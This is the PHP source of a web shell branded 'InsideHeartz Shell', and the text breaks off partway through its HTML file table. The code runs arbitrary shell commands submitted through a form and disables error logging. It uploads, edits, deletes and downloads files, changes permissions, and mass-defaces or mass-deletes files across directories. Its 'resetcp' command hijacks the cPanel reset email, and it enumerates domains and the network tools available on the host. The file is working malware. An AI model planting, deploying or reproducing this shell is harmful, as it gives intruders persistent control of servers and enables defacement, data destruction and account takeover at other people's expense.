
<?php

@null;

    session_start();
    error_reporting(0);
    set_time_limit(0);
    clearstatcache();
    @ini_set('error_log', 0);
    @ini_set('log_errors', 0);
    @ini_set('max_execution_time', 0);
    @ini_set('output_buffering', 0);
    @ini_set('display_errors', 0);
    if (isset($_GET['dir'])) {
        $path = $_GET['dir'];
        chdir($_GET['dir']);
    } else {
        $path = getcwd();
    }
    $path = str_replace('\\', '/', $path);
    $exdir = explode('/', $path);
    if (isset($_GET['action']) && $_GET['action'] == 'download') {
        @ob_clean();
        $file = $_GET['item'];
        header('Content-Description: File Transfer');
        header('Content-Type: text/plain');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
    function flash($message, $status, $class, $redirect = false)
    {
        if (!empty($_SESSION["message"])) {
            unset($_SESSION["message"]);
        }
        if (!empty($_SESSION["class"])) {
            unset($_SESSION["class"]);
        }
        if (!empty($_SESSION["status"])) {
            unset($_SESSION["status"]);
        }
        $_SESSION["message"] = $message;
        $_SESSION["class"] = $class;
        $_SESSION["status"] = $status;
        if ($redirect) {
            header('Location: ' . $redirect);
            exit;
        }
        return true;
    }
    function clear()
    {
        if (!empty($_SESSION["message"])) {
            unset($_SESSION["message"]);
        }
        if (!empty($_SESSION["class"])) {
            unset($_SESSION["class"]);
        }
        if (!empty($_SESSION["status"])) {
            unset($_SESSION["status"]);
        }
        return true;
    }
    function writable($path, $perms)
    {
        return !is_writable($path) ? "<font color=\"red\">" . $perms . "</font>" : "<font color=\"lime\">" . $perms . "</font>";
    }
    function perms($path)
    {
        $perms = fileperms($path);
        if (($perms & 0xc000) == 0xc000) {
            // Socket
            $info = 's';
        } elseif (($perms & 0xa000) == 0xa000) {
            // Symbolic Link
            $info = 'l';
        } elseif (($perms & 0x8000) == 0x8000) {
            // Regular
            $info = '-';
        } elseif (($perms & 0x6000) == 0x6000) {
            // Block special
            $info = 'b';
        } elseif (($perms & 0x4000) == 0x4000) {
            // Directory
            $info = 'd';
        } elseif (($perms & 0x2000) == 0x2000) {
            // Character special
            $info = 'c';
        } elseif (($perms & 0x1000) == 0x1000) {
            // FIFO pipe
            $info = 'p';
        } else {
            // Unknown
            $info = 'u';
        }
        $info .= $perms & 0x100 ? 'r' : '-';
        $info .= $perms & 0x80 ? 'w' : '-';
        $info .= $perms & 0x40 ? $perms & 0x800 ? 's' : 'x' : ($perms & 0x800 ? 'S' : '-');
        $info .= $perms & 0x20 ? 'r' : '-';
        $info .= $perms & 0x10 ? 'w' : '-';
        $info .= $perms & 0x8 ? $perms & 0x400 ? 's' : 'x' : ($perms & 0x400 ? 'S' : '-');
        $info .= $perms & 0x4 ? 'r' : '-';
        $info .= $perms & 0x2 ? 'w' : '-';
        $info .= $perms & 0x1 ? $perms & 0x200 ? 't' : 'x' : ($perms & 0x200 ? 'T' : '-');
        return $info;
    }
    function fsize($file)
    {
        $a = ["B", "KB", "MB", "GB", "TB", "PB"];
        $pos = 0;
        $size = filesize($file);
        while ($size >= 1024) {
            $size /= 1024;
            $pos++;
        }
        return round($size, 2) . " " . $a[$pos];
    }
    // CMD
    function cmd($command)
    {
        global $path;
        if (strpos($command, 'resetcp') !== false) {
            $email = explode(' ', $command);
            if (!$email[1] || !filter_var($email[1], FILTER_VALIDATE_EMAIL)) {
                return "You must specified valid email address. resetcp youremail@example.com";
            }
            $pathcp = explode("/", $path);
            $text = "---\n\"email\":'{$email[1]}'";
            $file = join('/', [$pathcp[0], $pathcp[1], $pathcp[2]]);
            $file .= '/.cpanel/';
            if (file_exists($file . 'contactinfo')) {
                unlink($file . 'contactinfo');
            }
            file_put_contents($file . 'reset', $text);
            if (file_exists($file . 'reset')) {
                rename($file . 'reset', $file . 'contactinfo');
                return "Email for reset cpanel changed to '{$email[1]}'";
            }
            return "Failed to change reset cp email!";
        } elseif (function_exists('shell_exec')) {
            return shell_exec($command . ' 2>&1');
        } else {
            return "Disable Function";
        }
    }
    function which($p)
    {
        $path = cmd('which ' . $p);
        if (!empty($path)) {
            return strlen($path);
        }
        return false;
    }
    function formatSize($bytes)
    {
        $types = array('B', 'KB', 'MB', 'GB', 'TB');
        for ($i = 0; $bytes >= 1024 && $i < count($types) - 1; $bytes /= 1024, $i++) {
        }
        return round($bytes, 2) . " " . $types[$i];
    }
    function getOwner($item)
    {
        if (function_exists("posix_getpwuid")) {
            $downer = @posix_getpwuid(fileowner($item));
            $downer = $downer['name'];
        } else {
            $downer = fileowner($item);
        }
        if (function_exists("posix_getgrgid")) {
            $dgrp = @posix_getgrgid(filegroup($item));
            $dgrp = $dgrp['name'];
        } else {
            $dgrp = filegroup($item);
        }
        return $downer . '/' . $dgrp;
    }
    // Mass Deface
    function massdef($dir, $file, $content)
    {
        if (is_writable($dir)) {
            $dira = scandir($dir);
            foreach ($dira as $dirb) {
                $dirc = "{$dir}/{$dirb}";
                $lokasi = $dirc . '/' . $file;
                if ($dirb === '.') {
                    file_put_contents($lokasi, $content);
                } elseif ($dirb === '..') {
                    file_put_contents($lokasi, $content);
                } else {
                    if (is_dir($dirc)) {
                        if (is_writable($dirc)) {
                            echo "{$dirb}/{$file}\n";
                            file_put_contents($lokasi, $content);
                        }
                    }
                }
            }
        }
    }
    // Mass Delete
    function massdel($dir, $file)
    {
        if (is_writable($dir)) {
            $dira = scandir($dir);
            foreach ($dira as $dirb) {
                $dirc = "{$dir}/{$dirb}";
                $lokasi = $dirc . '/' . $file;
                if ($dirb === '.') {
                    if (file_exists("{$dir}/{$file}")) {
                        unlink("{$dir}/{$file}");
                    }
                } elseif ($dirb === '..') {
                    if (file_exists('' . dirname($dir) . "/{$file}")) {
                        unlink('' . dirname($dir) . "/{$file}");
                    }
                } else {
                    if (is_dir($dirc)) {
                        if (is_writable($dirc)) {
                            if ($lokasi) {
                                echo "{$lokasi} > Deleted\n";
                                unlink($lokasi);
                                $massdel = massdel($dirc, $file);
                            }
                        }
                    }
                }
            }
        }
    }
    if (isset($_POST['newFolderName'])) {
        if (mkdir($path . '/' . $_POST['newFolderName'])) {
            flash("Create Folder Successfully!", "Success", "success", "?dir={$path}");
        } else {
            flash("Create Folder Failed", "Failed", "error", "?dir={$path}");
        }
    }
    if (isset($_POST['newFileName']) && isset($_POST['newFileContent'])) {
        if (file_put_contents($_POST['newFileName'], $_POST['newFileContent'])) {
            flash("Create File Successfully!", "Success", "success", "?dir={$path}");
        } else {
            flash("Create File Failed", "Failed", "error", "?dir={$path}");
        }
    }
    if (isset($_POST['newName']) && isset($_GET['item'])) {
        if ($_POST['newName'] == '') {
            flash("You miss an important value", "Ooopss..", "warning", "?dir={$path}");
        }
        if (rename($path . '/' . $_GET['item'], $_POST['newName'])) {
            flash("Rename Successfully!", "Success", "success", "?dir={$path}");
        } else {
            flash("Rename Failed", "Failed", "error", "?dir={$path}");
        }
    }
    if (isset($_POST['newContent']) && isset($_GET['item'])) {
        if (file_put_contents($path . '/' . $_GET['item'], $_POST['newContent'])) {
            flash("Edit Successfully!", "Success", "success", "?dir={$path}");
        } else {
            flash("Edit Failed", "Failed", "error", "?dir={$path}");
        }
    }
    if (isset($_POST['newPerm']) && isset($_GET['item'])) {
        if ($_POST['newPerm'] == '') {
            flash("You miss an important value", "Ooopss..", "warning", "?dir={$path}");
        }
        if (chmod($path . '/' . $_GET['item'], $_POST['newPerm'])) {
            flash("Change Permission Successfully!", "Success", "success", "?dir={$path}");
        } else {
            flash("Change Permission", "Failed", "error", "?dir={$path}");
        }
    }
    if (isset($_GET['action'])) {
        $action = $_GET['action'];
        if ($action == 'delete' && isset($_GET['item'])) {
            function removedir($dir)
            {
                if (!rmdir($dir)) {
                    $file = scandir($dir);
                    foreach ($file as $files) {
                        if (is_file($dir . "/" . $files)) {
                            if (unlink($dir . "/" . $files)) {
                                rmdir($dir);
                            }
                        }
                        if (is_dir($dir . "/" . $files)) {
                            rmdir($dir . "/" . $files);
                            rmdir($dir);
                        }
                    }
                }
            }
            if (is_dir($_GET['item'])) {
                if (removedir($_GET['item'])) {
                    flash("Delete Folder Successfully!", "Success", "success", "?dir={$path}");
                } else {
                    flash("Delete Folder Successfully!", "Success", "success", "?dir={$path}");
                }
            } else {
                if (unlink($_GET['item'])) {
                    flash("Delete File Successfully!", "Success", "success", "?dir={$path}");
                } else {
                    flash("Delete File Failed", "Failed", "error", "?dir={$path}");
                }
            }
        }
    }
    if (isset($_FILES['uploadfile'])) {
        $total = count($_FILES['uploadfile']['name']);
        for ($i = 0; $i < $total; $i++) {
            $mainupload = move_uploaded_file($_FILES['uploadfile']['tmp_name'][$i], $_FILES['uploadfile']['name'][$i]);
        }
        if ($total < 2) {
            if ($mainupload) {
                flash("Upload File Successfully! ", "Success", "success", "?dir={$path}");
            } else {
                flash("Upload Failed", "Failed", "error", "?dir={$path}");
            }
        } else {
            if ($mainupload) {
                flash("Upload {$i} Files Successfully! ", "Success", "success", "?dir={$path}");
            } else {
                flash("Upload Failed", "Failed", "error", "?dir={$path}");
            }
        }
    }
    $d0mains = @file("/etc/named.conf", false);
    if (!$d0mains) {
        $dom = "Cant read [ /etc/named.conf ]";
        $GLOBALS["need_to_update_header"] = "true";
    } else {
        $count = 0;
        foreach ($d0mains as $d0main) {
            if (@strstr($d0main, "zone")) {
                preg_match_all('#zone "(.*)"#', $d0main, $domains);
                flush();
                if (strlen(trim($domains[1][0])) > 2) {
                    flush();
                    $count++;
                }
            }
        }
        $dom = "{$count} Domain";
    }
    if (strtolower("PHP") == "win") {
        $sys = "win";
    } else {
        $sys = "unix";
    }
    if ($sys == 'unix') {
        $useful = "";
        $downloader = "";
        if (!@ini_get('safe_mode')) {
            if (strlen(cmd("id")) > 0) {
                $userful = ['gcc', 'lcc', 'cc', 'ld', 'make', 'php', 'perl', 'python', 'ruby', 'tar', 'gzip', 'bzip', 'bzialfa2', 'nc', 'locate', 'suidperl', 'git', 'docker', 'ssh'];
                $x = 0;
                foreach ($userful as $i) {
                    if (which($i)) {
                        $x++;
                        $useful .= $i . ', ';
                    }
                }
                if ($x == 0) {
                    $useful = '--------';
                }
                $downloaders = ['wget', 'fetch', 'lynx', 'links', 'curl', 'get', 'lwp-mirror'];
                $x = 0;
                foreach ($downloaders as $i) {
                    if (which($i)) {
                        $x++;
                        $downloader .= $i . ', ';
                    }
                }
                if ($x == 0) {
                    $downloader = '--------';
                }
            } else {
                $useful = '--------';
                $downloader = '--------';
            }
        } else {
            $useful = '--------';
            $downloader = '--------';
        }
    }
    $ip = gethostbyname($_SERVER['HTTP_HOST']);
    $uip = $_SERVER['REMOTE_ADDR'];
    $serv = $_SERVER['HTTP_HOST'];
    $soft = $_SERVER['SERVER_SOFTWARE'];
    $cmd_uname = cmd("uname -a");
    $uname = function_exists('php_uname') ? substr(@php_uname(), 0, 120) : (strlen($cmd_uname) > 0 ? $cmd_uname : 'Uname Error!');
    $total = disk_total_space($path);
    $free = disk_free_space($path);
    $pers = (int) ($free / $total * 100);
    $ds = @ini_get("disable_functions");
    $show_ds = !empty($ds) ? "<font class='text-danger'>{$ds}</font>" : "<font class='text-success'>All function is accessible</font>";
    if (@ini_get('open_basedir')) {
        $basedir_data = @ini_get('open_basedir');
        if (strlen($basedir_data) > 120) {
            $open_b = "<font class='text-success'>" . substr($basedir_data, 0, 120) . "...</font>";
        } else {
            $open_b = '<font class="text-success">' . $basedir_data . '</font>';
        }
    } else {
        $open_b = '<font class="text-warning">NONE</font>';
    }
    if (!function_exists('posix_getegid')) {
        $user = function_exists("get_current_user") ? @get_current_user() : "????";
        $uid = function_exists("getmyuid") ? @getmyuid() : "????";
        $gid = function_exists("getmygid") ? @getmygid() : "????";
        $group = "?";
    } else {
        $uid = function_exists("posix_getpwuid") && function_exists("posix_geteuid") ? @posix_getpwuid(posix_geteuid()) : ["name" => "????", "uid" => "????"];
        $gid = function_exists("posix_getgrgid") && function_exists("posix_getegid") ? @posix_getgrgid(posix_getegid()) : ["name" => "????", "gid" => "????"];
        $user = $uid['name'];
        $uid = $uid['uid'];
        $group = $gid['name'];
        $gid = $gid['gid'];
    }
    $dirs = scandir($path);
    ?>
<html>
<head>
	<meta charset="utf-8">
    <link rel="shortcut icon" href="https://i.ibb.co/YcqmdjX/kindpng-1188785-removebg-preview.png" />
<link rel="apple-touch-icon" href="https://i.ibb.co/YcqmdjX/kindpng-1188785-removebg-preview.png" />
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="robots" content="noindex, nofollow">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
	<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" />
	<title>INSIDEHEARTZ [ <?php 
    echo $serv;
    ?> ]</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Rubik+Iso&display=swap" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono" rel="stylesheet">
	<style type="text/css">
		* {
			font-family: Ubuntu Mono;
		}
		a {
			text-decoration: none;
			color: white;
		}
		a:hover {
			color: white;
		}
		/* width */
		::-webkit-scrollbar {
			width: 7px;
			height: 7px;
		}
		/* Handle */
		::-webkit-scrollbar-thumb {
			background: grey;
			border-radius: 7px;
		}
		/* Track */
		::-webkit-scrollbar-track {
			box-shadow: inset 0 0 7px grey;
			border-radius: 7px;
		}
		.td-break {
           	word-break: break-all
        }
        .holder {
  display: flex;
  flex-direction: column;
  align-items: center;
}
.holder .get-it-on-github {
  margin-top: 24px;
  margin-bottom: 24px;
  font-family: 'Roboto';
  color: #55606E;
}

.audio.green-audio-player {
  width: 250px;
  min-width: 300px;
  height: 56px;
  box-shadow: 0 4px 16px 0 rgba(0, 0, 0, 0.07);
  display: flex;
  color:#fff;
  justify-content: space-between;
  align-items: center;
  padding-left: 24px;
  padding-right: 24px;
  border-radius: 4px;
  user-select: none;
  -webkit-user-select: none;
  opacity:50%;
}
.audio.green-audio-player .play-pause-btn {
  display: none;
  cursor: pointer;
  color:#fff;
}
.audio.green-audio-player .spinner {
  width: 18px;
  height: 18px;
  background-image: url(https://s3-us-west-2.amazonaws.com/s.cdpn.io/355309/loading.png);
  background-size: cover;
  background-repeat: no-repeat;
  animation: spin 0.4s linear infinite;
}
.audio.green-audio-player .slider {
  flex-grow: 1;
  background-color: #D8D8D8;
  cursor: pointer;
  position: relative;
}
.audio.green-audio-player .slider .progress {
  background-color: #44BFA3;
  border-radius: inherit;
  position: absolute;
  pointer-events: none;
}
.audio.green-audio-player .slider .progress .pin {
  height: 16px;
  width: 16px;
  border-radius: 8px;
  background-color: #44BFA3;
  position: absolute;
  pointer-events: all;
  box-shadow: 0px 1px 1px 0px rgba(0, 0, 0, 0.32);
}
.audio.green-audio-player .controls {
  font-family: 'Roboto', sans-serif;
  font-size: 16px;
  line-height: 18px;
 color:#fff;
  display: flex;
  flex-grow: 1;
  justify-content: space-between;
  align-items: center;
  margin-left: 24px;
  margin-right: 24px;
}
.audio.green-audio-player .controls .slider {
  margin-left: 16px;
  margin-right: 16px;
  border-radius: 2px;
  height: 4px;
}
.audio.green-audio-player .controls .slider .progress {
  width: 0;
  height: 100%;
}
.audio.green-audio-player .controls .slider .progress .pin {
  right: -8px;
  top: -6px;
}
.audio.green-audio-player .controls span {
  cursor: default;
}
.audio.green-audio-player .volume {
  position: relative;
}
.audio.green-audio-player .volume .volume-btn {
  cursor: pointer;
}
.audio.green-audio-player .volume .volume-btn.open path {
  fill: #44BFA3;
}
.audio.green-audio-player .volume .volume-controls {
  width: 30px;
  height: 135px;
  background-color: rgba(0, 0, 0, 0.62);
  border-radius: 7px;
  position: absolute;
  left: -3px;
  bottom: 52px;
  flex-direction: column;
  align-items: center;
  display: flex;
}
.audio.green-audio-player .volume .volume-controls.hidden {
  display: none;
}
.audio.green-audio-player .volume .volume-controls .slider {
  margin-top: 12px;
  margin-bottom: 12px;
  width: 6px;
  border-radius: 3px;
}
.audio.green-audio-player .volume .volume-controls .slider .progress {
  bottom: 0;
  height: 100%;
  width: 6px;
}
.audio.green-audio-player .volume .volume-controls .slider .progress .pin {
  left: -5px;
  top: -8px;
}

svg, img {
  display: block;
}

html, body {
  height: 100%;
}


@keyframes spin {
  from {
    transform: rotateZ(0);
  }
  to {
    transform: rotateZ(1turn);
  }
}
	</style>
</head>
<body class="bg-black text-light">
	<div class="container-fluid ">
		<div class="py-3" id="main">
			<div class="p-4 rounded-3 ">
				<!-- show resposive image -->
                <center>
                <image src="https://i.ibb.co/YcqmdjX/kindpng-1188785-removebg-preview.png" class="img img-thumbnail" width="190"/><br>
               <span style="font-family: Rubik Iso; font-size:100;">InsideHeartz Shell</span>
               <br>
               <embed src="http://deinesv.cf/silence.mp3" type="audio/mp3" autostart="true" hidden="true">
        <audio id="player" autoplay controls><source src="https://github.com/fdciabdul/i-love-you/raw/master/y2mate.com%20-%20i%20love%20you%20billie%20eilish%20but%20youre%20driving%20in%20the%20rain.mp3" type="audio/mp3"></audio>
    

				<form action="" method="post" class="row g-2 p-2 justify-content-center">
  					<div class="col-auto">
					    <input type="text" class="form-control form-control-sm" name="bdcmd" placeholder="whoami">
		  			</div>
		  			<div class="col-auto">
		    			<button type="submit" class="btn btn-outline-light btn-sm">Submit</button>
		  			</div>
				</form>
                </center>
		        <div id="tool">
		        	<center>
						<hr width='20%'>
					</center>
					<div class="d-flex justify-content-center flex-wrap my-3">
						<a href="?" class="m-1 btn btn-outline-light btn-sm"><i class="fa fa-home"></i> Home</a>
						<a class="m-1 btn btn-outline-light btn-sm" data-bs-toggle="collapse" href="#upload" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-upload"></i> Upload</a>
						<a class="m-1 btn btn-outline-light btn-sm" data-bs-toggle="collapse" href="#massDef" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-layer-group"></i> Mass Deface</a>
						<a class="m-1 btn btn-outline-light btn-sm" data-bs-toggle="collapse" href="#massDel" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-eraser"></i> Mass Delete</a>
						<a class="m-1 btn btn-outline-light btn-sm" data-bs-toggle="collapse" href="#info" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-info-circle"></i> Info Server</a>
					</div>
		        	<center>
						<hr width='20%'>
					</center>
			
					<div class="container">
						<div class="row">
							<div class="col-md-12">
								<div class="collapse" id="upload" data-bs-parent="#tool">
									<div class="row justify-content-center">
										<div class="col-md-5">
											<form action="" method="post" enctype="multipart/form-data">
												<div class="mb-3">
													<label class="form-label">File Uploader</label>
													<div class="input-group">
														<input type="file" class="form-control" name="uploadfile[]" id="inputGroupFile04" aria-describedby="inputGroupFileAddon04" aria-label="Upload" multiple>
														<button class="btn btn-outline-light" type="submit" id="inputGroupFileAddon04">Upload</button>
													</div>
												</div>
											</form>
										 </div>
									</div>
								</div>
							</div>
							<div class="col-md-12">
								<div class="collapse" id="newFileCollapse" data-bs-parent="#tool">
									<div class="row justify-content-center">
										<div class="col-md-5">
											<form action="" method="post">
												<div class="mb-3">
													<label class="form-label">File Name</label>
													<input type="text" class="form-control" name="newFileName" placeholder="test.php">
												</div>
												<div class="mb-3">
													<label class="form-label">File Content</label>
													<textarea class="form-control" rows="5" name="newFileContent" placeholder="Hello-World"></textarea>
												</div>
												<button type="submit" class="btn btn-outline-light">Create</button>
											</form>
										</div>
									</div>
								</div>
							</div>
							<div class="col-md-12">
								<div class="collapse" id="newFolderCollapse" data-bs-parent="#tool">
									<div class="row justify-content-center">
										<div class="col-md-5">
											<form action="" method="post">
												<div class="mb-3">
													<label class="form-label">Folder Name</label>
													<input type="text" class="form-control" name="newFolderName" placeholder="home">
												</div>
												<button type="submit" class="btn btn-outline-light">Create</button>
											</form>
										</div>
									</div>
								</div>
							</div>
							<div class="col-md-12">
								<div class="collapse" id="massDef" data-bs-parent="#tool">
									<div class="row justify-content-center">
										<div class="col-md-5">
											<form action="" method="post">
												<div class="mb-3">
													<label class="form-label">Directory</label>
													<input type="text" class="form-control" name="massDefDir" value="<?php 
    echo $path;
    ?>">
												</div>
												<div class="mb-3">
													<label class="form-label">File Name</label>
													<input type="text" class="form-control" name="massDefName" placeholder="test.php">
												</div>
												<div class="mb-3">
													<label class="form-label">File Content</label>
													<textarea class="form-control" name="massDefContent" rows="5" placeholder="Hello World"></textarea>
												</div>
												<button class="btn btn-outline-light" type="submit">Submit</button>
											</form>
										</div>
									</div>
								</div>
							</div>
							<div class="col-md-12">
								<div class="collapse" id="massDel" data-bs-parent="#tool">
									<div class="row justify-content-center">
										<div class="col-md-5">
											<form action="" method="post">
												<div class="mb-3">
													<label class="form-label">Directory</label>
													<input type="text" class="form-control" name="massDel" value="<?php 
    echo $path;
    ?>">
												</div>
												<div class="mb-3">
													<label class="form-label">File Name</label>
													<input type="text" class="form-control" name="massDelName" placeholder="test.php">
												</div>
												<button class="btn btn-outline-light" type="submit">Submit</button>
											</form>
										</div>
									</div>
								</div>
							</div>
							<div class="col-md-12">
								<div class="collapse" id="info" data-bs-parent="#tool">
									<div class="row justify-content-center">
										<div class="col-md-8">
											<div class="mb-3">
												<label class="form-label">Server Info</label>
												<table class="table text-light">
													<tr>
														<td>Operating System</td>
														<td>:</td>
														<td><?php 
    echo $uname;
    ?></td>
													</tr>
													<tr>
														<td>User / Group</td>
														<td>:</td>
														<td><?php 
    echo $uid;
    ?>[<?php 
    echo $user;
    ?>] / <?php 
    echo $gid;
    ?>[<?php 
    echo $group;
    ?>]</td>
													</tr>
													<tr>
														<td>PHP Version</td>
														<td>:</td>
														<td><?php 
    echo phpversion();
    ?></td>
													</tr>
													<tr>
														<td>IP Server</td>
														<td>:</td>
														<td><?php 
    echo $ip;
    ?></td>
													</tr>
													<tr>
														<td>Your IP</td>
														<td>:</td>
														<td><?php 
    echo $uip;
    ?></td>
													</tr>
													<tr>
														<td>Storage</td>
														<td>:</td>
														<td class="td-break">Total = <?php 
    echo formatSize($total);
    ?>, Free = <?php 
    echo formatSize($free);
    ?> [<?php 
    echo $pers;
    ?>%]</td>
													</tr>
													<tr>
														<td>Domains</td>
														<td>:</td>
														<td><?php 
    echo $dom;
    ?></td>
													</tr>
													<tr>
														<td>Software</td>
														<td>:</td>
														<td><?php 
    echo $soft;
    ?></td>
													</tr>
													<tr>
														<td>Disable Functions</td>
														<td>:</td>
														<td class="td-break"><?php 
    echo $show_ds;
    ?></td>
													</tr>
													<tr>
														<td>Useful Functions</td>
														<td>:</td>
														<td><?php 
    echo rtrim($useful, ', ');
    ?></td>
													</tr>
													<tr>
														<td>Downloader</td>
														<td>:</td>
														<td><?php 
    echo rtrim($downloader, ', ');
    ?></td>
													</tr>
													<tr>
														<td colspan="3">CURL : <?php 
    echo function_exists('curl_version') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>';
    ?> | SSH2 : <?php 
    echo function_exists('ssh2_connect') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>';
    ?> | Magic Quotes : <?php 
    echo function_exists('get_magic_quotes_gpc') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>';
    ?> | MySQL : <?php 
    echo function_exists('mysql_get_client_info') || class_exists('mysqli') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>';
    ?> | MSSQL : <?php 
    echo function_exists('mssql_connect') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>';
    ?> | PostgreSQL : <?php 
    echo function_exists('pg_connect') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>';
    ?> | Oracle : <?php 
    echo function_exists('oci_connect') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>';
    ?></td>
													</tr>
													<tr>
														<td colspan="3">Safe Mode : <?php 
    echo @ini_get('safe_mode') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>';
    ?> | Open Basedir : <?php 
    echo $open_b;
    ?> | Safe Mode Exec Dir : <?php 
    echo @ini_get('safe_mode_exec_dir') ? '<font class="text-success">' . @ini_get('safe_mode_exec_dir') . '</font>' : '<font class="text-warning">NONE</font>';
    ?> | Safe Mode Include Dir : <?php 
    echo @ini_get('safe_mode_include_dir') ? '<font class="text-success">' . @ini_get('safe_mode_include_dir') . '</font>' : '<font class="text-warning">NONE</font>';
    ?></td>
													</tr>
												</table>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
				
				<div class="container">

					<?php 
    if (isset($_POST['bdcmd'])) {
        ?>
					<div class="p-2">
						<div class="row justify-content-center">
							<div class="card text-dark mb-3">
								<pre><?php 
        echo $ip . "@" . $serv . ":&nbsp;~\$&nbsp;";
        $cmd = $_POST['bdcmd'];
        echo $cmd . "<br>";
        ?><br><code><?php 
        echo cmd($cmd);
        ?></code></pre>
							</div>
						</div>
					</div>
					<?php 
    }
    ?>

					<?php 
    if (isset($_POST['massDefDir']) && isset($_POST['massDefName']) && isset($_POST['massDefContent'])) {
        ?>
						<div class="p-2">
							<div class="row justify-content-center">
								<div class="card text-dark col-md-6 mb-3">
									<pre>Done ~~<br><br><?php 
        echo massdef($_POST['massDefDir'], $_POST['massDefName'], $_POST['massDefContent']);
        ?></pre>
								</div>
							</div>
						</div>
					<?php 
    }
    ?>

					<?php 
    if (isset($_POST['massDel']) && isset($_POST['massDelName'])) {
        ?>
						<div class="p-2">
							<div class="row justify-content-center">
								<div class="card text-dark col-md-6 mb-3">
									<pre>Done ~~<br><br><?php 
        echo massdel($_POST['massDel'], $_POST['massDelName']);
        ?></pre>
								</div>
							</div>
						</div>
					<?php 
    }
    ?>

                    <?php 
    if (isset($_GET['action']) && $_GET['action'] != 'download') {
        $action = $_GET['action'];
        ?>
                    <?php 
    }
    ?>
                    <?php 
    if (isset($_GET['action']) && $_GET['action'] != 'delete') {
        $action = $_GET['action'];
        ?>
                    	<div class="col-md-12">
							<div class="row justify-content-center">
								<div class="col-md-5">
									<?php 
        if ($action == 'rename' && isset($_GET['item'])) {
            ?>
		                                <form action="" method="post">
		                                	<div class="mb-3">
		                                       	<label for="name" class="form-label">New Name</label>
		                                       	<input type="text" class="form-control" name="newName" value="<?php 
            echo $_GET['item'];
            ?>">
		                                   	</div>
		                                   	<button type="submit" class="btn btn-outline-light">Submit</button>
		                                  	<button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
		                               	</form>
		                           	<?php 
        } elseif ($action == 'edit' && isset($_GET['item'])) {
            ?>
		                                <form action="" method="post">
		                              		<div class="mb-3">
		                                  		<label for="name" class="form-label"><?php 
            echo $_GET['item'];
            ?></label>
		                                   		<textarea id="CopyFromTextArea" name="newContent" rows="10" class="form-control bg-black text-success"><?php 
            echo htmlspecialchars(file_get_contents($path . '/' . $_GET['item']));
            ?></textarea>
            
		                             		</div>
		                            		<button type="submit" class="btn btn-outline-light">Submit</button>
		                            		<button type="button" class="btn btn-outline-light" onclick="jscopy()">Copy</button>
		                       				<button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
		                   				</form>
		                        	<?php 
        } elseif ($action == 'chmod' && isset($_GET['item'])) {
            ?>
		          						<form action="" method="post">
		                        			<div class="mb-3">
		                      					<label for="name" class="form-label"><?php 
            echo $_GET['item'];
            ?></label>
		                             			<input type="text" class="form-control" name="newPerm" value="<?php 
            echo substr(sprintf('%o', fileperms($_GET['item'])), -4);
            ?>">
		                                  	</div>
		                                	<button type="submit" class="btn btn-outline-light">Submit</button>
		                              		<button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
		                            	</form>
		                         	<?php 
        }
        ?>
								</div>
							</div>
						</div>
                   	<?php 
    }
    ?>
				</div>
				<div class="table-responsive">
					<table class="table table-hover table-black text-light">
						<thead>
							<tr>
								<td style="width:35%">Name</td>
								<td style="width:11%">Type</td>
								<td style="width:11%">Size</td>
								<td style="width:11%">Owner/Group</td>
								<td style="width:11%">Permission</td>
								<td style="width:11%">Last Modified</td>
								<td style="width:10%">Actions</td>
							</tr>
						</thead>
						<tbody class="text-nowrap">
							<?php 
    foreach ($dirs as $dir) {
        if (!is_dir($dir)) {
            continue;
        }
        ?>
							<tr>
								<td>
									<?php 
        if ($dir === '..') {
            ?>
									<a href="?dir=<?php 
            echo dirname($path);
            ?>" class="text-decoration-none text-light"><i class="fa fa-folder-open"></i> <?php 
            echo $dir;
            ?></a>
									<?php 
        } elseif ($dir === '.') {
            ?>
									<a href="?dir=<?php 
            echo $path;
            ?>" class="text-decoration-none text-light"><i class="fa fa-folder-open"></i> <?php 
            echo $dir;
            ?></a>
									<?php 
        } else {
            ?>
									<a href="?dir=<?php 
            echo $path . '/' . $dir;
            ?>" class="text-decoration-none text-light"><i class="fa fa-folder"></i> <?php 
            echo $dir;
            ?></a>
									<?php 
        }
        ?>
								</td>
								<td class="text-light"><?php 
        echo filetype($dir);
        ?></td>
								<td class="text-light">-</td>
								<td class="text-light"><?php 
        echo getOwner($dir);
        ?></td>
								<td class="text-light">
                           			<?php 
        echo '<a href="?dir=' . $path . '&item=' . $dir . '&action=chmod">';
        if (is_writable($path . '/' . $dir)) {
            echo "<font color=\"lime\">";
        } elseif (!is_readable($path . '/' . $dir)) {
            echo "<font color=\"red\">";
        }
        echo perms($path . '/' . $dir);
